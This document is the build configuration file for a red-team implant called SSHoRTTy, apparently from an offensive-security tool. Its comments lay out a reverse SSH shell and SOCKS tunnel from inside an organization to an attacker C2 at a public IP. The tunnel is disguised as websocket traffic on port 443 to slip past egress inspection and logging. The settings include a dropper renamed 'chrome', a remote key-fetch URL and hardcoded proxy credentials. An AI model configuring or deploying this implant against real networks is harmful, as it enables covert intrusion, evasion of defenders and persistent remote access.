
#####################################################################################################
#
#       SSHoRTTy: Linux (future Mac) SSH real time shell implant
#           - Build custom versions for every environment
#           - Achieve full shell on internal host over reverse SSH tunnels.
#             readline, history, terminal UI, scp, sftp, exec over the same chanel
#           - SOCKS support out of the box
#             Future:  X forward, direct local and remote port tunnels.
#           - Armorized egress from corporate environment over websockets
#           - Proxy awareness (explicit and from environment) and ability to have credentials support
#           - Future: HTTP/2 tunnels
#
#           Future: Ability to specify and control commands run in restricted shells by junior RTOs.
#


####################### BUILD CONFIGURATION #########################################################
#           === Regular SSH Tunnel ===
#
# Goals:
#       - Do not use local SSH clients, drop your own. Avoids logging
#       - Cannot task employees to run convoluted SSH commands for us. One binary launch.
#       - Default SOCKS ports for convenience of the Red team operator.
#       - Achieves distributed nature of the connectivity and helps avoid attribution
#
# [Organization]  ----- |Internet| ------ [Attacker C2]
#
#      (Dropper)  ------ Call back ------> SSH Server -------------------|
#                                                                        |  Attacker SSH shell client
# 1. Internal Host <==== SSH Client <= Reverse Shell ==== SSH Server ----|          (rendezvous)
#                                                                        |  Attacker Browser+SOCKS
# 2. Internal Hosts N <==== SSH Client <= Reverse SOCKS ==== SSH Server -|
#    Internal Hosts N+1
#
#
#
#           === Websocket Armorized SSH Tunnel ===
#
# Goals:
#       - Hide from egress deep packet inspection catching SSH traffic
#       - Allow mimicry of a legitimate websocket traffic
#       - Work with a potential outbound proxy, support authentication
#       - Egress on port 443
#
# How it fits in the overall design:
#
#
# [Organization]  ------------------------|Internet| -- [Attacker C2]
#
# (Dropper)  -----> <company egress proxy> ----------> Red Websocket proxy
#                                                   | --> TCP tunnel --> Red SSH Server
#                                                                         |--> rendezvous SOCKS ports
#                                                                                   ^
#                                                            Private SSH for Red ___|
#                                                                        ^
#                                        Red Team oper __________________|
#
#

######################## CONFIGURATION ####################################

##  SSH SSHServer (host)
# Proper publicly visible SSH host to connect/redirect to
# Please note: without armorized tunnels this is the only option to reach SSH server
# When using armorized tunnels like websockify over WSS:// you may have more exit options
# For example, if the WSS:// exit host is multihomed you could connect to the second network's SSH server
# SSHServerHost=10.16.0.5
# Or, you can even listen SSH on the localhost only if directly terminating agents on the WSS:// exit host
# This affords no exposure of SSH port to the wild at all.
# SSHServerHost=167.99.88.24
SSHServerHost=127.0.0.1

# SSH port the Red server or a redirect listens on for agents on the exit node
SSHServerPort=222

# OS account with the private key the implant has to connect to the SSH server with
# see gen_ssh_user.sh
SSHServerUser=4fa48c653682c3b04add14f434a3114

# Implant ID
ImplantID=${SSHServerUser}

## Implant SSH protected B64 wrapped PK for distribution and embedding
# Option A: Local encrypted key wrapped in Base64 which gets embedded into the implant
# If file is embedded no remote SSH key fetch is made from the hosting server
SSHServerUserKeyFile="./out/${ImplantID}/${ImplantID}"
# !! SSHServerUserKey= < contents of ${SSHServerUserKeyFile} > Filled in at build time

# Option B: if the key needs to be pulled remotely
# The agent pulls the protected key and decrypts a key with a password.
# This is not SSH PK encryption, but a SSHORTY's "on the wire" protection scheme.
# Why not a direct pass-phrase encrypted SSH PK? Because there are a ton of SSH key file formats.
# For now we want to deal with a straight RSA 4096 keys, without relying on OpenSSH format quirks.
# tool: keygen.go
SSHServerUserKeyUrl="http://127.0.0.1:9000/${ImplantID}.bpk"

# Implant SSH protection password (wire, in-code storage safety)
# tool: keygen.go
SSHServerUserKeyPassphrase=$( dd if=/dev/urandom bs=1024 count=1 2>/dev/null | shasum | cut -c 1-31  )
SSHServerUserKeyBits=4096

# Channel IP for reverse SSH tunnel (addr)
# After the initial SSH session is established
# listen on SSH and SOCKS ports on this address for reverse tunnels
SSHRemoteCmdHost=127.0.0.1

# Channel IP for reverse SSH tunnel (port)
SSHRemoteCmdPort=2022

# Channel IP for reverse tunnel SOCKS (addr)
SSHRemoteSocksHost=127.0.0.1

# Channel IP for reverse tunnel SOCKS (port)
SSHRemoteSocksPort=1080

# Operator Implant logon (user)
# Reverse tunnels' user on Red side
# This is used for an additional authentication to protect reverse tunnels from the RT insiders
SSHRemoteCmdUser=operator

# Operator Implant logon (password)
# Randomized on every build.
# Ex: SSHRemoteCmdPwd=da39a3ee5e6b4b0d3255bfef9560189
SSHRemoteCmdPwd=$( dd if=/dev/urandom bs=1024 count=1 2>/dev/null | shasum | cut -c 1-31  )

# The implant introspects SHELL variable from the destination environment,
# If it is undefined it falls back to this:
SSHShell="/bin/sh"

# `exec` TERM value, vt100, xterm, etc.
SSHEnvTerm="xterm"


#--------------- :: Transport :: -----------------#
# How do we get to the SSH tunnel.  WS/WSS and Proxies

# Intercepting Proxy (Burp)
# export http_proxy="http://127.0.0.1:8088"
HTTPProxyFromEnvironment="yes"

# Egress proxy
# TODO: HTTP/S proxy
HTTPProxy="http://167.99.88.24:8080" # Squid

# Egress proxy auth (plain)
# TODO: research NTLM if needed  https://github.com/vadimi/go-http-ntlm
HTTPProxyAuthUser="companyuser"
HTTPProxyAuthPass="Drag0n"


#---------- :: Armorized Carrier :: ---------------#
# HTTP endpoint:
HTTPEndpoint="http://167.99.88.24:8082"

# WS/WSS endpoint:
WSEndpoint="wss://167.99.88.24:8082/stream"


#----------- :: Implant Operating Context :: ---#
# Implant Exe name
DropperName="chrome"

# Supported OS:
#  darwin
#  linux
DropperOS="darwin"

# Supported ARCH:
#  amd64
#  i386
DropperArch="amd64"

# Background and detach from console. Currently, not very elegant (no setsid(), no renaming)
# Turn On: "yes"
Daemonize="no"

# Log progress messages to file (local debug)
# We do not want to log in production, but we want to debug to a log file locally
LogFile="/tmp/${DropperName}.log"

# Track the implant PID
PIDFile="/tmp/${DropperName}.pid"